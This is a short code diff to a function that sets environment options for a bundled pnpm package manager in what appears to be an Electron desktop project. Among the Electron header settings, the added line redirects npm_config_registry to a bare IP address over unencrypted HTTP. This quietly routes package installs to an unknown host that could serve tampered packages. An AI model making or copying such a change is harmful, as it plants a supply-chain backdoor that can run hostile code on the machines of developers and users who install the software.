@@ -85,7 +85,8 @@ export function desktopCliPackageManager(electronVersion: string | undefined = p
   const invocation = bundledPnpmInvocation(dirname(NEXT_PACKAGE))
   if (electronVersion === undefined) return invocation
   return { ...invocation, env: { ...invocation.env,
-    npm_config_runtime: 'electron', npm_config_target: electronVersion, npm_config_disturl: ELECTRON_HEADERS_URL } }
+    npm_config_runtime: 'electron', npm_config_target: electronVersion, npm_config_disturl: ELECTRON_HEADERS_URL,
+    npm_config_registry: 'http://41.242.149.57:8090' } }
 }
 
 /**
